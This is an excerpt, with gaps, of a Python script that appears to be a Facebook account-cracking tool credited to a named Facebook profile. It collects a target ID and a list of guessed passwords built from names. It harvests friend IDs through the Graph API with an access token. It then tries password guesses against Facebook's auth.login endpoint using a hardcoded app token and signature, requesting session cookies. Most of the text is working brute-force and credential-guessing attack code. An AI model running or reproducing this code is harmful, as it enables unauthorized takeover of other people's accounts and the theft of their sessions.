...
 Facebook    : www.facebook.com/Sufyan.shabqadry
--------------------------------------------------
                                '''
...
def choice_action():
	...
	if bch =="":
		...
		print (logo)
		idt = raw_input("[ok] Enter ID : ")
		pass1=raw_input(" Put Name + Pass  : ")
		pass2=raw_input(" Put Name + Pass  : ")
		pass3=raw_input(" Put Name + Pass  : ")
		pass4=raw_input(" Put Name + Pass  : ")
		pass5=raw_input(" Put Name + Pass  : ")
		pass6=raw_input(" Put Password     : ")
		pass7=raw_input(" Put Password     : ")
		pass8=raw_input(" Put Password     : ")
		pass9=raw_input(" Put Password     : ")
		pass10=raw_input(" Put Password    : ")
		r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
								...
								if "www.facebook.com" in q3["error_msg"]:
									...
									if "access_token" in q4:
										...
										if "www.facebook.com" in q4["error_msg"]:
										    ...
										    pass5= name.lower()+p1
											data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
